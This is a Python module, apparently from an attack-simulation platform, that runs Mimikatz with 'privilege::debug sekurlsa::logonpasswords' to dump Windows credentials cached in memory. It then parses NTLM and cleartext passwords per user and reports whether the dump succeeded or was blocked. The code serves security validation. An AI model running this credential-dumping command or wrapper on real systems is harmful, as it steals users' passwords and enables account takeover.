from ai_utils.utils.offensive.windows_passwords.abstract_windows_passwords import AbstractWindowsPasswordsAgent
from ai_utils.utils.offensive.windows_passwords.mimikatz.mimikatz_reporter import MimikatzReporter
from ai_utils.utils.offensive.windows_passwords.mimikatz.mimikatz_parser import MimikatzParser
from ai_utils.utils.scenarioutils import PathUtils
import logging

try:
  import aipythonlib
except Exception as e:
  logging.error('Error importing aipythonlib: {0}'.format(e))


class MimikatzAgent(AbstractWindowsPasswordsAgent):

  def __init__(self, cred_types=None, usernames=None, phase_reporter=None):
    """
    This utility will execute Mimikatz in order to obtain the credentials cached in memory. The command that is executed
    is "privilege::debug sekurlsa::logonpasswords exit".

    The result object after parsing mimikatz output has the following format:
    CredentialsObject = [
      {
        'sid': SID,
        'user': USER,
        'domain': DOMAIN,
        'msv': {'user': USER, 'password': PASSWORD, 'domain': DOMAIN}
        'tspkg': {'user': USER, 'password': PASSWORD, 'domain': DOMAIN}
        'wdigest': {'user': USER, 'password': PASSWORD, 'domain': DOMAIN}
        'livessp': {'user': USER, 'password': PASSWORD, 'domain': DOMAIN}
        'kerberos': {'user': USER, 'password': PASSWORD, 'domain': DOMAIN}
        'ssp': {'user': USER, 'password': PASSWORD, 'domain': DOMAIN}
        'credman': {'user': USER, 'password': PASSWORD, 'domain': DOMAIN}
      }
      ,
      {(...)},
      {(...)}
    ]

    :param cred_types (list): This parameter is a list that specifies what type of credentials will be printed in
    FireDrill UI. Only valid value: "all", "ntlm", "cleartext".

    ntlm credential type will print Mimikatz output for "msv" authentication provider.
    cleartext credential type will print Mimikatz output for 'tspkg', 'wdigest', 'livessp', 'kerberos', 'ssp'
    and 'credman' authentication providers.

    :param usernames (list): This parameter is a lsit that specifies what users will be the ones for which their
    credentials will be printed in the FireDrill UI.

    :param phase_reporter (obj): This object is the PhaseReporter class from the AbstractPhaseClass. It is used to
    print messages to FireDrill UI. If this parameter is none, logging module will be used instead and messages
    will be printed to a log file.
    """
    logging.debug('Executing MimikatzAgent constructor')
    self.credentials_object = []
    self.valid_cred_types = ["all", "ntlm", "cleartext"]
    self.cred_types = self.setup_cred_types_parameter(cred_types)
    self.usernames = self.setup_usernames_parameter(usernames)
    self.phase_reporter = phase_reporter

  def setup_password_dumping_tool(self):
    if not PathUtils.FindFile('mimikatz.exe'):
      self.log_error('Mimikatz tool (mimikatz.exe) not found in path')
      return False
    return True

  def dump_windows_passwords(self):
    logging.debug('Executing get_all_credentials')
    cred_objects = self.get_logon_passwords()
    self.credentials_object.extend(cred_objects)
    return self.check_phase_success()

  def get_logon_passwords(self):
    logging.debug('Executing get_logon_passwords')
    self.log_debug('Mimikatz command "sekurlsa::logonpasswords" will be used...')
    stdout = self.execute_mimikatz('privilege::debug sekurlsa::logonpasswords exit')
    return self.process_mimikatz_command_output(stdout)

  def execute_mimikatz(self, command_line):
    logging.debug('Executing execute_mimikatz. command_line: {}'.format(command_line))
    timeout = 120000
    error_code, exit_code, std_out, std_error = aipythonlib.AiRunCommand('mimikatz.exe', command_line, timeout)
    if error_code == 0 and std_error == '' and exit_code == 0:
      self.log_info('Mimikatz was successfully executed')
      std_out = std_out.strip()
    else:
      self.log_info('Mimikatz execution was prevented. Check scenario logs to get further details.')
      logging.warning('Commandline: {0}, Exit Code: {1}, Error Code: {2}, Error Message: {3}'.format(command_line, exit_code, error_code, std_error.strip()))
      std_out = ''
    return std_out

  @staticmethod
  def process_mimikatz_command_output(output):
    logging.debug('Executing process_mimikatz_command_output. output: {}(...)'.format(output[:20]))
    credential_objects = []
    if output:
      credential_objects = MimikatzParser.parse_logongpasswords_output(output)
    else:
      logging.debug('Mimikatz output is empty. Something went wrong')
    return credential_objects

  def check_phase_success(self):
    """
    Phase will be successful if credentials of the type specified by the phase parameter exist for the user specified
    by the phase parameter
    """
    logging.debug('Executing check_phase_success')
    success = False
    if len(self.credentials_object) > 0:
      if self.usernames:
        success = self.if_creds_for_specific_usernames()
      else:
        for cred_object in self.credentials_object:
          success = self.if_valid_credentials(cred_object)
          if success:
            break
    return success

  def if_creds_for_specific_usernames(self):
    logging.debug('Executing if_creds_for_specific_usernames')
    valid_creds = False
    for cred_object in self.credentials_object:
      if cred_object.get('user', '').lower() in self.usernames:
        valid_creds = self.if_valid_credentials(cred_object)
        if valid_creds:
          return valid_creds
    return valid_creds

  def if_valid_credentials(self, cred_object):
    logging.debug('Executing if_valid_credentials. cred_object: (redacted)')
    if 'all' in self.cred_types:
      for cred_type in ['tspkg', 'wdigest', 'livessp', 'kerberos', 'ssp', 'credman']:
        if cred_object[cred_type]:  # if there are credentials of any type
          return True
    if 'ntlm' in self.cred_types:
      if cred_object['msv']:
        return True
    if 'cleartext' in self.cred_types:
      if cred_object['wdigest'] or cred_object['kerberos'] or cred_object['tspkg']:
        return True
    return False

  def setup_cred_types_parameter(self, cred_types):
    logging.debug('Executing setup_cred_types_parameter. cred_types: {}'.format(cred_types))
    param = []
    if cred_types:
      for cred_type in cred_types:
        if cred_type in self.valid_cred_types:
          param.append(cred_type)
        else:
          logging.warning('Ignoring credential type: "{}", not supported. Valid credential types: {}'.format(cred_type, self.valid_cred_types))
    else:
      param = ['all']
    return param

  @staticmethod
  def setup_usernames_parameter(usernames):
    logging.debug('Executing setup_usernames_parameter. usernames: {}'.format(usernames))
    param = []
    if usernames:
      param = [username.lower() for username in usernames]
    return param

  def log_results(self, phase_successful):
    logging.debug('Executing log_results. phase_successful: {}'.format(phase_successful))
    if phase_successful:
      mimikatz_reporter = MimikatzReporter(self.cred_types, self.usernames, self.credentials_object, self.phase_reporter)
      mimikatz_reporter.report()
    else:
      if self.usernames:
        self.log_info('Failed to find Windows credentials cached in memory for usernames "{}" of type "{}"'.format(', '.join(self.usernames), ', '.join(self.cred_types)))
      else:
        self.log_info('Failed to find Windows credentials cached in memory of type "{}"'.format(', '.join(self.cred_types)))

  def log_info(self, msg):
    if self.phase_reporter:
      self.phase_reporter.Info(msg)
    else:
      logging.info(msg)

  def log_debug(self, msg):
    if self.phase_reporter:
      self.phase_reporter.Debug(msg)
    else:
      logging.info(msg)

  def log_error(self, msg):
    if self.phase_reporter:
      self.phase_reporter.Error(msg)
    else:
      logging.error(msg)